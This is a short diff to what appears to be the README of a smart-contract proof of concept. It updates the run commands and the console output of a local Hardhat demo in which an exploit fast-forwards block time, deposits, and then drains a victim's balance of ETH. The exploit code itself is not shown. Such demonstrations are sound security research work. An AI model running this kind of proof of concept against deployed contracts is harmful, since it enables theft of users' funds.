@@ -15,11 +15,16 @@ npm i
 npx hardhat run scripts/poc.js
 ```
 
-```bash
+```bash  
 Vulnerable contract has been deployed to : 0x5FbDB2315678afecb367f032d93F642f64180aa3
 Balance of the victim on vulnerable contract :  50.0
-[1] Current block timestamp before block fast-forward :  1660640430
-[2] Current block timestamp after block fast-forward :  1661245230
-BAL AFTER DEPOSITING THE AMOUNT :  50000000000000000000
-RECIEVED :  50000000000000000000
+[1] Current block timestamp before block fast-forward :  1661493170
+[2] Current block timestamp after block fast-forward :  1662097970
+===
+ EXPLOIT START 
+===
+[exploit] BALANCE AFTER DEPOSITING THE AMOUNT :  50000000000000000000
+[exploit] RECEIVED ETH :  50000000000000000000
+[exploit] STEALING BALANCE OF :  10000000000000000000
+[exploit] RECEIVED ETH :  10000000000000000000
 ```
